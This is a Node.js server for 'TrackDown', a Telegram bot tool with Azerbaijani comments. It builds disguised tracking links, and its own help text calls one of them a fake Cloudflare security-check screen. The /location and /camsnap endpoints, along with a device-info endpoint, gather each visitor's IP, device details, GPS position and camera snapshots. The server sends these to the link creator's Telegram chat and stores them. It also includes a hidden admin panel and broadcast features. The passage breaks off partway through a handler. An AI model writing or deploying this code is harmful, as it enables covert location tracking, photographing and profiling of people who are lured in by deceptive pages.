/**
 * ============================================================
 *  TrackDown — Ana Server
 *  Dəstəklənən: Railway · Render · Heroku · Fly.io · Replit · VPS
 * ============================================================
 */

const config      = require('./config');
const fs          = require('fs');
const path        = require('path');
const express     = require('express');
const cors        = require('cors');
const bp          = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// ═══════════════════════════════════════════════════════════
//  STORE — Persistent JSON storage
// ═══════════════════════════════════════════════════════════
const DATA_DIR   = path.join(__dirname, 'data');
const STORE_FILE = path.join(DATA_DIR, 'store.json');

function loadStore() {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    if (fs.existsSync(STORE_FILE))
      return JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
  } catch (_) {}
  return { extraBots: [], deactivated: [], users: {}, userHistory: {}, deactivateSettings: {} };
}

function saveStore() {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(STORE_FILE, JSON.stringify(store, null, 2));
  } catch (e) {
    console.error('Store save xətası:', e.message);
  }
}

let store = loadStore();

// Ensure new fields exist (migration)
if (!store.users) store.users = {};
if (!store.userHistory) store.userHistory = {};
if (!store.deactivated) store.deactivated = [];
if (!store.extraBots) store.extraBots = [];
if (!store.deactivateSettings) store.deactivateSettings = {};
saveStore();

// ═══════════════════════════════════════════════════════════
//  YARDIMÇI FUNKSİYALAR
// ═══════════════════════════════════════════════════════════
function b64Encode(str) {
  return Buffer.from(str, 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g,  '');
}

function b64Decode(str) {
  let s = str.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64').toString('utf8');
}

function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.connection?.remoteAddress || req.ip || '';
}

function buildHostFromReq(req) {
  const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'https')
    .split(',')[0].trim();
  const host  = req.headers['x-forwarded-host'] || req.headers.host || '';
  return host ? `${proto}://${host}` : null;
}

function getHostURL(req) {
  if (config.STATIC_HOST) return config.STATIC_HOST;
  return buildHostFromReq(req);
}

function getMediaType() {
  const dir = path.join(__dirname, 'view');
  if (fs.existsSync(path.join(dir, 'photo.png')))    return 'photo';
  if (fs.existsSync(path.join(dir, 'video.mp4')))    return 'video';
  if (fs.existsSync(path.join(dir, 'animate.gif')))  return 'gif';
  if (fs.existsSync(path.join(dir, 'custom.html')))  return 'html';
  return 'none';
}

function isDeactivated(uid, enc) {
  return store.deactivated.includes(`${uid}:${enc}`);
}

function deactivateLink(uid, enc) {
  const key = `${uid}:${enc}`;
  if (!store.deactivated.includes(key)) {
    store.deactivated.push(key);
    saveStore();
  }
}

function shortToken(token) {
  if (!token) return '???';
  const parts = token.split(':');
  if (parts.length < 2) return token.slice(0, 10) + '...';
  return parts[0] + ':' + parts[1].slice(0, 4) + '****';
}

// ═══════════════════════════════════════════════════════════
//  İSTİFADƏÇİ İZLƏMƏ / BAN SİSTEMİ
// ═══════════════════════════════════════════════════════════
function trackUser(chatId, userInfo) {
  const uid = chatId.toString(36);
  if (!store.users[uid]) {
    store.users[uid] = {
      first_name: userInfo.first_name || '',
      username: userInfo.username || '',
      banned: false,
      created_at: new Date().toISOString()
    };
    saveStore();
  }
}

function isUserBanned(chatId) {
  const uid = chatId.toString(36);
  return store.users[uid]?.banned || false;
}

const IMG_DIR = path.join(__dirname, 'data', 'images');

// ═══════════════════════════════════════════════════════════
//  TARİXÇƏ ƏLAVƏ ETMƏ
// ═══════════════════════════════════════════════════════════
function addHistoryEntry(uid, entry) {
  if (!store.userHistory[uid]) store.userHistory[uid] = [];
  store.userHistory[uid].push({
    ...entry,
    timestamp: new Date().toISOString()
  });
  saveStore();
}

// ═══════════════════════════════════════════════════════════
//  İSTİFADƏÇİ LİSTİ AL
// ═══════════════════════════════════════════════════════════
function getAllUserIds() {
  return Object.keys(store.users);
}

function getAllUserChatIds() {
  return getAllUserIds().map(id => parseInt(id, 36)).filter(id => !isNaN(id));
}


// ═══════════════════════════════════════════════════════════
//  RUNTIME HOST TRACKER
// ═══════════════════════════════════════════════════════════
let runtimeHost = config.STATIC_HOST || null;

function updateRuntimeHost(req) {
  if (runtimeHost) return;
  const url = buildHostFromReq(req);
  if (!url || url.includes('localhost') || url.includes('127.0.0.1')) return;
  runtimeHost = url;
  console.log(`🌐  Host URL avtomatik müəyyən edildi: ${runtimeHost}`);
}

// ═══════════════════════════════════════════════════════════
//  CHAT → BOT MAPPING (hansı bot hansı chatId-ə xidmət etdi)
// ═══════════════════════════════════════════════════════════
const chatBotMap = {};

// ═══════════════════════════════════════════════════════════
//  CONVERSATION STATES
// ═══════════════════════════════════════════════════════════
const chatStates = {};

function setState(cid, state) { chatStates[cid] = state; }
function getState(cid)        { return chatStates[cid] || null; }
function clearState(cid)      { delete chatStates[cid]; }

// ═══════════════════════════════════════════════════════════
//  EXPRESS QURAŞDIRMASI
// ═══════════════════════════════════════════════════════════
const app = express();
app.use(bp.json({ limit: '20mb', type: 'application/json' }));
app.use(bp.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'view'));
app.use('/static', express.static(path.join(__dirname, 'view')));
app.set('trust proxy', true);
app.use((req, _res, next) => { updateRuntimeHost(req); next(); });

const USE_SHORTENER = false;

// ═══════════════════════════════════════════════════════════
//  DEAKTİV SƏHIFƏ GENERATOR (qırmızı glitch effekti ilə)
// ═══════════════════════════════════════════════════════════
function generateDeactivatedPage() {
  const ds = store.deactivateSettings || {};
  const customText = ds.customText || '';
  const mediaType = ds.mediaType || null;
  const mediaFile = ds.mediaFile || null;
  const displayText = customText || 'THE LIFE IS NOT FAIR, YOU SHOULD NOT BE A FAIR';

  // Media varsa (şəkil/video/html)
  if (mediaType && mediaFile) {
    const mediaPath = '/static/' + mediaFile;
    if (mediaType === 'photo') {
      return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>*{margin:0;padding:0;box-sizing:border-box;}html,body{width:100%;height:100%;overflow:hidden;background:#000;}img{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:contain;}</style>
</head>
<body><img src="${mediaPath}" /></body>
</html>`;
    }
    if (mediaType === 'video') {
      return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>*{margin:0;padding:0;box-sizing:border-box;}html,body{width:100%;height:100%;overflow:hidden;background:#000;}video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:contain;}</style>
</head>
<body>
<video id="dv" autoplay muted playsinline><source src="${mediaPath}" type="video/mp4"></video>
<script>
(function(){
  var v = document.getElementById('dv');
  v.muted = false;
  v.play().then(function(){
    if (v.requestFullscreen) v.requestFullscreen();
    else if (v.webkitRequestFullscreen) v.webkitRequestFullscreen();
  }).catch(function(){});
})();
</script>
</body>
</html>`;
    }
    if (mediaType === 'html') {
      // HTML faylını oxu
      try {
        const htmlPath = path.join(__dirname, 'view', mediaFile);
        if (fs.existsSync(htmlPath)) {
          return fs.readFileSync(htmlPath, 'utf8');
        }
      } catch (_) {}
    }
  }

  // Mətn göstər (glitch effekti ilə)
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;font-family:'Courier New',monospace;}
.glitch-wrap{position:relative;text-align:center;max-width:100vw;padding:20px;}
.glitch{font-size:clamp(14px,3vw,36px);color:#ff0015;font-weight:900;letter-spacing:2px;text-transform:uppercase;position:relative;display:inline-block;white-space:nowrap;}
@media(max-width:600px){.glitch{white-space:normal;font-size:clamp(12px,4vw,24px);}}
.glitch::before,.glitch::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%;background:#000;}
.glitch::before{animation:glitch1 2.5s infinite linear alternate-reverse;color:#00f;clip-path:polygon(0 0,100% 0,100% 35%,0 35%);}
.glitch::after{animation:glitch2 2s infinite linear alternate-reverse;color:#0f0;clip-path:polygon(0 65%,100% 65%,100% 100%,0 100%);}
@keyframes glitch1{0%{transform:translate(0)}20%{transform:translate(-3px,2px)}40%{transform:translate(3px,-1px)}60%{transform:translate(-2px,3px)}80%{transform:translate(2px,-2px)}100%{transform:translate(0)}}
@keyframes glitch2{0%{transform:translate(0)}20%{transform:translate(2px,-2px)}40%{transform:translate(-3px,1px)}60%{transform:translate(3px,-3px)}80%{transform:translate(-2px,2px)}100%{transform:translate(0)}}
.scanlines{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,0,0.03) 2px,rgba(255,0,0,0.03) 4px);z-index:2;}
.flicker{animation:flicker 0.15s infinite;}
@keyframes flicker{0%{opacity:1}50%{opacity:0.8}100%{opacity:1}}
</style>
</head>
<body>
<div class="glitch-wrap flicker">
  <span class="glitch" data-text="${displayText.replace(/"/g,'&quot;')}">${displayText}</span>
</div>
<div class="scanlines"></div>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════════════
//  ROUTES
// ═══════════════════════════════════════════════════════════

// Webview linki
app.get('/w/:uid/:uri', (req, res) => {
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  if (isDeactivated(uid, uri)) return res.send(generateDeactivatedPage());

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render('webview', {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
});

// Cloudflare linki
app.get('/c/:uid/:uri', (req, res) => {
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  if (isDeactivated(uid, uri)) return res.send(generateDeactivatedPage());

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render('cloudflare', {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
});

// Ana səhifə
app.get('/', (req, res) => {
  res.json({ status: 'TrackDown aktiv', ip: getClientIP(req) });
});

// ═══════════════════════════════════════════════════════════
//  DATA TOPLAMA ENDPOINTLƏR
// ═══════════════════════════════════════════════════════════

app.post('/', (req, res) => {
  const uid  = decodeURIComponent(req.body.uid  || '');
  const data = decodeURIComponent(req.body.data || '');
  const ip   = getClientIP(req);

  if (!uid || !data || !data.includes(ip)) return res.send('ok');

  const chatId    = parseInt(uid, 36);
  const targetBot = chatBotMap[chatId] || mainBot;
  targetBot.sendMessage(chatId, data.replaceAll('<br>', '\n'), { parse_mode: 'HTML' }).catch(() => {});

  // Tarixçəyə əlavə et
  addHistoryEntry(uid, { type: 'device_info', content: data });

  res.send('Done');
});

app.post('/location', (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;

  if (!lat || !lon || !uid) return res.send('ok');

  const chatId    = parseInt(uid, 36);
  const targetBot = chatBotMap[chatId] || mainBot;
  targetBot.sendLocation(chatId, lat, lon).catch(() => {});
  targetBot.sendMessage(chatId, `📍 GPS Məkanı\nEnlik: ${lat}\nUzunluq: ${lon}\nDəqiqlik: ${acc} metr`).catch(() => {});

  // Tarixçəyə əlavə et
  addHistoryEntry(uid, { type: 'location', lat, lon, acc });

  res.send('Done');
});

app.post('/camsnap', (req, res) => {
  const uid = decodeURIComponent(req.body.uid || '');
  const img = decodeURIComponent(req.body.img || '');

  if (!uid || !img) return res.send('ok');

  const chatId    = parseInt(uid, 36);
  const targetBot = chatBotMap[chatId] || mainBot;
  const buffer    = Buffer.from(img, 'base64');
  targetBot.sendPhoto(chatId, buffer, {}, { filename: 'camsnap.png', contentType: 'image/png' })
           .catch(err => console.error('Kamera xətası:', err.message));

  // Tarixçəyə əlavə et - şəkli diskə yadda saxla
  try {
    if (!fs.existsSync(IMG_DIR)) fs.mkdirSync(IMG_DIR, { recursive: true });
    const imgName = `${uid}_${Date.now()}.png`;
    fs.writeFileSync(path.join(IMG_DIR, imgName), buffer);
    addHistoryEntry(uid, { type: 'image', file: imgName });
  } catch (_) {}

  res.send('Done');
});

// ═══════════════════════════════════════════════════════════
//  ADMİN PANEL — Inline Keyboard Builders
// ═══════════════════════════════════════════════════════════

function mainPanelKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: "🤖 Botlar", callback_data: "panel:bots" },
        { text: "📁 Fayllar", callback_data: "panel:files" }
      ],
      [
        { text: "👥 İstifadəçilər", callback_data: "panel:users" },
        { text: "📢 Toplu mesaj", callback_data: "panel:broadcast" }
      ],
      [
        { text: "🔴 Deaktiv mesajı", callback_data: "panel:deactivate" }
      ],
      [
        { text: "➕ Yeni Bot", callback_data: "panel:addbot" },
        { text: "❌ Bağla", callback_data: "panel:close" }
      ]
    ]
  };
}

function botsKeyboard() {
  const rows = [];
  rows.push([{ text: "🟢 Main: " + shortToken(config.TOKEN), callback_data: "noop" }]);
  store.extraBots.forEach((b, i) => {
    rows.push([
      { text: "🔵 " + shortToken(b.token), callback_data: "noop" },
      { text: "🗑 Sil", callback_data: "bot:del:" + i }
    ]);
  });
  rows.push([{ text: "◀️ Geri", callback_data: "panel:main" }]);
  return { inline_keyboard: rows };
}

// File key → actual filename mapping
const FILE_MAP = {
  'video.mp4':   'video.mp4',
  'photo.png':   'photo.png',
  'animate.gif': 'animate.gif',
  '.html':       'custom.html'   // user-uploaded html; index.html is system-protected
};

function filesKeyboard() {
  const dir  = path.join(__dirname, "view");
  const rows = [];
  rows.push([{ text: "📁  F A Y L L A R  📁", callback_data: "noop" }]);
  Object.entries(FILE_MAP).forEach(([label, fname]) => {
    const exists = fs.existsSync(path.join(dir, fname));
    rows.push([{ text: (exists ? "✅" : "❌") + " " + label, callback_data: "file:" + label }]);
  });
  rows.push([{ text: "◀️ Geri", callback_data: "panel:main" }]);
  return { inline_keyboard: rows };
}

function fileConfirmKeyboard(label) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Hə', callback_data: `filedelconf:${label}` },
        { text: '❌ Yox', callback_data: 'panel:files' }
      ]
    ]
  };
}
function usersKeyboard() {
  const rows = [];
  const userIds = getAllUserIds();
  rows.push([{ text: "👥  İSTİFADƏÇİLƏR  👥", callback_data: "noop" }]);
  if (userIds.length === 0) {
    rows.push([{ text: "❌ İstifadəçi yoxdur", callback_data: "noop" }]);
  } else {
    userIds.forEach(uid => {
      const u = store.users[uid];
      const name = u?.first_name || u?.username || uid;
      const status = u?.banned ? "🔴" : "🟢";
      rows.push([{ text: status + " " + name, callback_data: "user:view:" + uid }]);
    });
  }
  rows.push([{ text: "◀️ Geri", callback_data: "panel:main" }]);
  return { inline_keyboard: rows };
}

function userViewKeyboard(uid) {
  const u = store.users[uid];
  return {
    inline_keyboard: [
      [{ text: "⛔ Məhdudiyyətlər", callback_data: "user:restrict:" + uid }],
      [{ text: "📋 İstifadəçi geçmişi", callback_data: "user:history:" + uid }],
      [
        { text: "🗑 İstifadəçini sil", callback_data: "user:delete:" + uid },
        { text: "◀️ Geri", callback_data: "panel:users" }
      ]
    ]
  };
}

function userRestrictKeyboard(uid) {
  const u = store.users[uid];
  const banText = u?.banned ? "✅ Banı qaldır" : "🔴 Banla";
  return {
    inline_keyboard: [
      [{ text: banText, callback_data: "user:ban:" + uid }],
      [{ text: "◀️ Geri", callback_data: "user:view:" + uid }]
    ]
  };
}

function userHistoryKeyboard(uid) {
  const rows = [];
  const history = store.userHistory[uid] || [];
  if (history.length === 0) {
    rows.push([{ text: "❌ Tarixçə boşdur", callback_data: "noop" }]);
  } else {
    rows.push([{ text: "🗑 Tarixçəni sil (" + history.length + " qeyd)", callback_data: "user:histdel:" + uid }]);
  }
  rows.push([{ text: "◀️ Geri", callback_data: "user:view:" + uid }]);
  return { inline_keyboard: rows };
}

// ═══════════════════════════════════════════════════════════
//  DEAKTİV MESAJ PANELİ — Keyboard Builders
// ═══════════════════════════════════════════════════════════

const DEACTIVATE_MEDIA_MAP = {
  'Şəkil (photo.png)':   'photo.png',
  'Video (video.mp4)':   'video.mp4',
  'HTML (custom.html)':  'custom.html'
};

function deactivateMainKeyboard() {
  const ds = store.deactivateSettings || {};
  const hasCustomText = ds.customText && ds.customText.length > 0;
  const hasMedia = ds.mediaType && ds.mediaFile;
  const currentType = hasMedia ? (ds.mediaType === "photo" ? "🖼 Şəkil" : ds.mediaType === "video" ? "🎥 Video" : "📄 HTML") : "✏️ Mətn";
  const currentLabel = hasCustomText ? ds.customText.substring(0, 20) + (ds.customText.length > 20 ? "..." : "") : "THE LIFE IS NOT FAIR...";
  
  return {
    inline_keyboard: [
      [{ text: "🔴  D E A K T İ V  M E S A J  🔴", callback_data: "noop" }],
      [{ text: currentType + ": " + currentLabel, callback_data: "noop" }],
      [
        { text: "✏️ Mətn əlavə et/dəyiş", callback_data: "deact:settext" },
        { text: "🖼 Media", callback_data: "deact:setmedia" }
      ],
      [{ text: "🗑 Mesajı sil (default-a qayıt)", callback_data: "deact:reset" }],
      [{ text: "◀️ Geri", callback_data: "panel:main" }]
    ]
  };
}

function deactivateMediaKeyboard() {
  const rows = [];
  const dir = path.join(__dirname, "view");
  Object.entries(DEACTIVATE_MEDIA_MAP).forEach(([label, fname]) => {
    const exists = fs.existsSync(path.join(dir, fname));
    rows.push([{ text: (exists ? "✅" : "❌") + " " + label, callback_data: "deact:media:" + fname }]);
  });
  rows.push([{ text: "◀️ Geri", callback_data: "panel:deactivate" }]);
  return { inline_keyboard: rows };
}

// ═══════════════════════════════════════════════════════════
//  BOT SETUP FACTORY
// ═══════════════════════════════════════════════════════════

function setupBotHandlers(botInstance) {

  botInstance.on('message', async (msg) => {
    const chatId = msg.chat.id;

    // ── İstifadəçini izlə ────────────────────────────────
    trackUser(chatId, msg.chat);

    // ── Ban yoxlaması ────────────────────────────────────
    if (isUserBanned(chatId)) {
      botInstance.sendMessage(chatId, '🚫 Admin Tərəfindən Banlandiniz');
      return;
    }

    // ── Conversation state handlers (əvvəl yoxlanır) ────
    const state = getState(chatId);

    if (state?.action === 'awaitUrl') {
      clearState(chatId);
      return createLink(botInstance, chatId, msg.text || '');
    }

    if (state?.action === 'awaitBotToken') {
      clearState(chatId);
      return addExtraBot(botInstance, chatId, (msg.text || '').trim());
    }

    if (state?.action === 'awaitBroadcast') {
      clearState(chatId);
      return handleBroadcast(botInstance, chatId, msg);
    }

    if (state?.action === 'awaitDeactText') {
      clearState(chatId);
      return handleDeactText(botInstance, chatId, msg);
    }

    // ── Fayl qəbulu ──────────────────────────────────────
    if (msg.video) {
      await handleVideo(botInstance, chatId, msg);
      return;
    }
    if (msg.photo) {
      await handlePhoto(botInstance, chatId, msg);
      return;
    }
    if (msg.document && msg.document.file_name?.toLowerCase().endsWith('.html')) {
      await handleHtml(botInstance, chatId, msg);
      return;
    }

    // ── Legacy reply_to_message check ────────────────────
    if (msg?.reply_to_message?.text === '🌐 Enter Your URL') {
      return createLink(botInstance, chatId, msg.text || '');
    }

    // ── Commands ─────────────────────────────────────────
    switch (msg.text) {

      case '/start': {
        const caption =
          `◈ 𝐓𝐇𝐄 𝐋𝐈𝐅𝐄 𝐈𝐒 𝐍𝐎𝐓 𝐅𝐀𝐈𝐑 ◈\n` +
          `◈ 𝐘𝐎𝐔 𝐒𝐇𝐎𝐔𝐋𝐃 𝐍𝐎𝐓 𝐁𝐄 𝐀 𝐅𝐀𝐈𝐑 ◈\n` +
          `▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
          `⚓ 𝘽𝙤𝙩 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝙗𝙮 𝙊𝙍𝙐𝙅𝙊𝙑 ⚓\n\n` +
          `Başlamaq üçün /create yazın.`;

        const markup = {
          reply_markup: JSON.stringify({
            inline_keyboard: [[{ text: '🔗 Link Yarat', callback_data: 'crenew' }]]
          })
        };

        const imgPath = path.join(__dirname, 'bot', 'bot.png');
        if (fs.existsSync(imgPath)) {
          botInstance.sendPhoto(chatId, imgPath, { caption, ...markup });
        } else {
          botInstance.sendMessage(chatId, `Xoş gəldiniz, ${msg.chat.first_name}!\n\n${caption}`, markup);
        }
        break;
      }

      case '/create':
        createNew(botInstance, chatId);
        break;

      case '/help':
        botInstance.sendMessage(chatId,
          `ℹ️ *TrackDown — Yardım*\n\n` +
          `Bu bot izləmə linki yaratmağa kömək edir.\n\n` +
          `*Addımlar:*\n` +
          `1️⃣ /create yazın\n` +
          `2️⃣ Hədəfə göstərmək istədiyiniz URL-i göndərin\n` +
          `3️⃣ 2 izləmə linki alacaqsınız\n\n` +
          `*Link növləri:*\n` +
          `🔵 *Cloudflare* — Saxta təhlükəsizlik yoxlama ekranı\n` +
          `🟢 *Webview* — Seçdiyiniz saytı iframe ilə göstərir\n\n` +
          `*Toplanan məlumatlar:*\n` +
          `• IP ünvanı və ISP\n` +
          `• Cihaz / brauzer məlumatları\n` +
          `• GPS koordinatları (icazə verilsə)\n` +
          `• Kamera şəkli (icazə verilsə)`,
          { parse_mode: 'Markdown' }
        );
        break;

      case '/66':
        botInstance.sendMessage(chatId,
          `⚙️ *Admin Panel*`,
          { parse_mode: 'Markdown', reply_markup: JSON.stringify(mainPanelKeyboard()) }
        );
        break;
    }
  });

  // ── Callback Query Handler ────────────────────────────────
  botInstance.on('callback_query', async (cbq) => {
    const chatId = cbq.message.chat.id;
    const msgId  = cbq.message.message_id;
    const data   = cbq.data;

    botInstance.answerCallbackQuery(cbq.id);

    // Link yaratma
    if (data === 'crenew') {
      clearState(chatId);
      return createNew(botInstance, chatId);
    }

    // Template link seçimi
    if (data.startsWith('tmpl:')) {
      const idx = parseInt(data.split(':')[1], 10);
      if (!isNaN(idx) && idx >= 0 && idx < TEMPLATE_LINKS.length) {
        const url = TEMPLATE_LINKS[idx].url;
        return createLink(botInstance, chatId, url);
      }
      return;
    }

    // Custom link (öz linkini yaz)
    if (data === 'custom:url') {
      setState(chatId, { action: 'awaitUrl' });
      botInstance.sendMessage(chatId, '✏️ *Öz linkinizi yazın*\n\nhttps:// ilə başlayan link göndərin:', {
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify({ force_reply: true })
      });
      return;
    }

    // Deaktivləşdirmə
    if (data.startsWith('deact:')) {
      const parts = data.split(':');
      const uid   = parts[1];
      const enc   = parts[2];
      if (uid && enc) {
        deactivateLink(uid, enc);
        // Köhnə mesajı (linkləri) sil
        botInstance.deleteMessage(chatId, msgId).catch(() => {});
        // Yeni bildiriş göndər
        botInstance.sendMessage(chatId, '🔴Linklər Deaktiv Edildi');
      }
      return;
    }

    // Noop (display-only buttons)
    if (data === 'noop') return;

    // ── Admin panel callbacks ─────────────────────────────

    if (data === 'panel:main') {
      return botInstance.editMessageText('⚙️ *Admin Panel*', {
        chat_id: chatId, message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify(mainPanelKeyboard())
      }).catch(() => {});
    }

    if (data === 'panel:close') {
      return botInstance.deleteMessage(chatId, msgId).catch(() => {});
    }

    if (data === 'panel:bots') {
      const count = 1 + store.extraBots.length;
      return botInstance.editMessageText(
        `🤖 *Botlar* (${count} ədəd)`,
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(botsKeyboard())
        }
      ).catch(() => {});
    }

    if (data === 'panel:files') {
      return botInstance.editMessageText(
        '📁 *Fayllar*',
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(filesKeyboard())
        }
      ).catch(() => {});
    }

    // Fayl üzərinə klik → təsdiq soruşulsun
    if (data.startsWith('file:')) {
      const label  = data.slice(5);
      const fname  = FILE_MAP[label];
      if (!fname) return;
      const exists = fs.existsSync(path.join(__dirname, 'view', fname));
      if (!exists) {
        return botInstance.answerCallbackQuery(cbq.id, { text: '❌ Fayl mövcud deyil', show_alert: true });
      }
      return botInstance.editMessageText(
        `🗑 *${label}* — Silmək istədiyinizdən əminsiz?`,
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(fileConfirmKeyboard(label))
        }
      ).catch(() => {});
    }

    // Fayl silməni təsdiqlədi → sil
    if (data.startsWith('filedelconf:')) {
      const label = data.slice(12);
      const fname = FILE_MAP[label];
      if (!fname) return;
      const fp = path.join(__dirname, 'view', fname);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
      return botInstance.editMessageText(
        '📁 *Fayllar*',
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(filesKeyboard())
        }
      ).catch(() => {});
    }

    if (data === 'panel:addbot') {
      setState(chatId, { action: 'awaitBotToken' });
      botInstance.sendMessage(chatId, '🤖 Yeni botun tokenini göndərin:\n\n_(Ləğv etmək üçün /66 yazın)_', { parse_mode: 'Markdown' });
      return;
    }

    // Bot silmə: bot:del:INDEX
    if (data.startsWith('bot:del:')) {
      const idx = parseInt(data.split(':')[2], 10);
      if (!isNaN(idx) && idx >= 0 && idx < store.extraBots.length) {
        const removed = store.extraBots.splice(idx, 1)[0];
        saveStore();
        // Extra bot instansiyasını dayandır (yeni process restart-a qədər pollingdə qalır, lakin store-dan silinir)
        botInstance.sendMessage(chatId, `🗑 Bot silindi: \`${shortToken(removed.token)}\``, { parse_mode: 'Markdown' });
        return botInstance.editMessageText(
          `🤖 *Botlar* (${1 + store.extraBots.length} ədəd)`,
          {
            chat_id: chatId, message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: JSON.stringify(botsKeyboard())
          }
        ).catch(() => {});
      }
    }
    // ── İstifadəçilər paneli ──────────────────────────────
    
    if (data === 'panel:users') {
      return botInstance.editMessageText(
        '👥 *İstifadəçilər*',
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(usersKeyboard())
        }
      ).catch(() => {});
    }

    // İstifadəçiyə bax
    if (data.startsWith('user:view:')) {
      const uid = data.split(':')[2];
      const u = store.users[uid];
      if (!u) {
        botInstance.answerCallbackQuery(cbq.id, { text: '❌ İstifadəçi tapılmadı', show_alert: true });
        return;
      }
      const name = u.first_name || u.username || uid;
      const status = u.banned ? '🔴 Banlanmış' : '🟢 Aktiv';
      const created = u.created_at ? new Date(u.created_at).toLocaleString('az') : '?';
      return botInstance.editMessageText(
        `👤 *İstifadəçi:* ${name}\n📛 *Status:* ${status}\n🆔 ` + '`' + uid + '`' + `\n📅 *Qoşulma:* ${created}`,
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(userViewKeyboard(uid))
        }
      ).catch(() => {});
    }

    // İstifadəçini sil
    if (data.startsWith('user:delete:')) {
      const uid = data.split(':')[2];
      if (store.users[uid]) {
        delete store.users[uid];
        saveStore();
      }
      return botInstance.editMessageText(
        '👥 *İstifadəçilər*',
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(usersKeyboard())
        }
      ).catch(() => {});
    }

    // Məhdudiyyətlər (ban/unban)
    if (data.startsWith('user:restrict:')) {
      const uid = data.split(':')[2];
      const u = store.users[uid];
      if (!u) {
        botInstance.answerCallbackQuery(cbq.id, { text: '❌ İstifadəçi tapılmadı', show_alert: true });
        return;
      }
      const banStatus = u.banned ? '🔴 Banlanmışdır' : '🟢 Aktivdir';
      return botInstance.editMessageText(
        `⛔ *Məhdudiyyətlər*\n\nİstifadəçi: ${u.first_name || u.username || uid}\nStatus: ${banStatus}`,
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(userRestrictKeyboard(uid))
        }
      ).catch(() => {});
    }

    // Banla / Banı qaldır
    if (data.startsWith('user:ban:')) {
      const uid = data.split(':')[2];
      if (store.users[uid]) {
        store.users[uid].banned = !store.users[uid].banned;
        saveStore();
      }
      const u = store.users[uid];
      const banStatus = u?.banned ? '🔴 Banlandı' : '🟢 Ban qaldırıldı';
      botInstance.answerCallbackQuery(cbq.id, { text: banStatus, show_alert: true });
      return botInstance.editMessageText(
        `⛔ *Məhdudiyyətlər*\n\nİstifadəçi: ${u?.first_name || u?.username || uid}\nStatus: ${u?.banned ? '🔴 Banlanmışdır' : '🟢 Aktivdir'}`,
        {
          chat_id: chatId, message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify(userRestrictKeyboard(uid))
        }
      ).catch(() => {});
    }

    // İstifadəçi geçmişi
    if (data.startsWith('user:history:')) {
      const uid = data.split(':')[2];
      const history = store.userHistory[uid] || [];
      
      if (history.length === 0) {
        return botInstance.editMessageText(
          `📋 *İstifadəçi geçmişi*\n\n❌ Heç bir məlumat yoxdur.`,
          {
            chat_id: chatId, message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: JSON.stringify(userHistoryKeyboard(uid))
          }
        ).catch(() => {});
      }

